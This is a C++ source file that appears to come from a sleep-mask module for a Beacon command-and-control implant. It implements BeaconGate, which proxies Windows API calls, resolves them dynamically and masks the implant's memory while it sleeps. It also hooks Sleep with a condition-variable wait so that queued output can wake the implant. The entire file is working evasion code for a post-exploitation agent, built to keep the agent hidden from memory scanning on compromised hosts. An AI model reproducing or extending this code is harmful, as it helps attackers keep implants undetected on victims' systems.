#include <windows.h>

// Include bof-vs header files
#include "beacon_gate.h"
#include "sleepmask.h"

// Include sleepmask-vs specific header files
#include "..\debug.h"
#include "..\sleepmask-vs.h"


pic::AsyncContext* get_or_create_async_data()
{
    DFR_LOCAL(KERNEL32, VirtualAlloc);
    DFR_LOCAL(KERNEL32, InitializeCriticalSection);
    DFR_LOCAL(KERNEL32, InitializeConditionVariable);

    auto* buffer = BeaconGetValue("asyncdata");

    if (!buffer) {
        buffer = VirtualAlloc(
            nullptr,
            sizeof(pic::AsyncContext),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (!buffer) {
            BeaconPrintf(
                CALLBACK_ERROR,
                "Failed to allocate thread registry.");
            return nullptr;
        }

        auto* async_data = reinterpret_cast<pic::AsyncContext*>(buffer);

        async_data->output = nullptr;
        InitializeCriticalSection(&async_data->mutex);
        InitializeConditionVariable(&async_data->cv);

        BeaconAddValue("asyncdata", buffer);
    }

    return static_cast<pic::AsyncContext*>(buffer);
}


/**
* A wrapper around BeaconGate to handle masking/unmasking Beacon
*
* @param info A pointer to a BEACON_INFO structure
* @param gateFunction A pointer to a FUNCTION_CALL structure
*/
void BeaconGateWrapper(PBEACON_INFO info, PFUNCTION_CALL gateFunction) {
    DFR_LOCAL(KERNEL32, Sleep);
    DFR_LOCAL(KERNEL32, WaitForSingleObject);
    DFR_LOCAL(KERNEL32, SleepConditionVariableCS);
    DFR_LOCAL(KERNEL32, EnterCriticalSection);
    DFR_LOCAL(KERNEL32, LeaveCriticalSection);
    DFR_LOCAL(msvcrt, calloc);
    
    if (gateFunction->bMask == TRUE) {
        MaskBeacon(info);
    }

    if (gateFunction->functionPtr == Sleep) {
        // Custom Wake Up Events
        if (gateFunction->bMask == TRUE) {
            UnMaskBeacon(info);
        }

        pic::AsyncContext* async_data = get_or_create_async_data();

        if (gateFunction->bMask == TRUE) {
            MaskBeacon(info);
        }

        if (!async_data->output) {
            async_data->output = (pic::vector<pic::OutputMessage>*)calloc(1, sizeof(pic::vector<pic::OutputMessage>));
        }

        pic::vector<pic::OutputMessage> local;

        bool timed_out = false;
        EnterCriticalSection(&async_data->mutex);
        while (async_data->output->size() == 0) {

            gateFunction->numOfArgs = 3;
            gateFunction->functionPtr = SleepConditionVariableCS;
            gateFunction->args[2] = gateFunction->args[0];
            gateFunction->args[1] = reinterpret_cast<ULONG_PTR>(&async_data->mutex);
            gateFunction->args[0] = reinterpret_cast<ULONG_PTR>(&async_data->cv);

            BeaconGate(gateFunction);

            if (!gateFunction->retValue) {
                timed_out = true;
                break;
            }
        }

        if (!timed_out && async_data->output->size() != 0) {
            async_data->output->swap(local);

            LeaveCriticalSection(&async_data->mutex);

            if (gateFunction->bMask == TRUE) {
                UnMaskBeacon(info);
            }
            for (auto& d : local) {
                constexpr const unsigned CALLBACK_WAKEUP = 0xff;
                if (d.type != CALLBACK_WAKEUP) {
                    BeaconPrintf(d.type, d.text.c_str());
                }
                
            }

            local.clear();
            return;
        }
        else {
            LeaveCriticalSection(&async_data->mutex);
        }


    }
    else {
        BeaconGate(gateFunction);
    }

    

    if (gateFunction->bMask == TRUE) {
        UnMaskBeacon(info);
    }

    return;
}

/**
* Execute BeaconGate.
*
* @param gateFunction A pointer to a FUNCTION_CALL structure
*/
void BeaconGate(PFUNCTION_CALL gateFunction) {
    ULONG_PTR retValue = 0;
    
    /** 
    * Call appropriate function pointer based on number of args.
    *
    * Note: This is not a switch statement because it adds linker
    * errors. 
    */
#if ENABLE_LOGGING
    PrintBeaconGateInfo(gateFunction);
#endif
    if (gateFunction->numOfArgs == 0) {
        retValue = beaconGate(00)();
    }
    else if (gateFunction->numOfArgs == 1) {
        retValue = beaconGate(01)(arg(0));
    }
    else if (gateFunction->numOfArgs == 2) {
        retValue = beaconGate(02)(arg(0), arg(1));
    }
    else if (gateFunction->numOfArgs == 3) {
        retValue = beaconGate(03) (arg(0), arg(1), arg(2));
    }
    else if (gateFunction->numOfArgs == 4) {
        retValue = beaconGate(04) (arg(0), arg(1), arg(2), arg(3));
    }
    else if (gateFunction->numOfArgs == 5) {
        retValue = beaconGate(05) (arg(0), arg(1), arg(2), arg(3), arg(4));
    }
    else if (gateFunction->numOfArgs == 6) {
        retValue = beaconGate(06) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5));
    }
    else if (gateFunction->numOfArgs == 7) {
        retValue = beaconGate(07) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6));
    }
    else if (gateFunction->numOfArgs == 8) {
        retValue = beaconGate(08) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7));
    }
    else if (gateFunction->numOfArgs == 9) {
        retValue = beaconGate(09) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8));
    }
    else if (gateFunction->numOfArgs == 10) {
        retValue = beaconGate(10) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8), arg(9));
    }

    gateFunction->retValue = retValue;
    DLOGF("BEACONGATE: Return value: 0x%p\n", retValue);

    return;
}
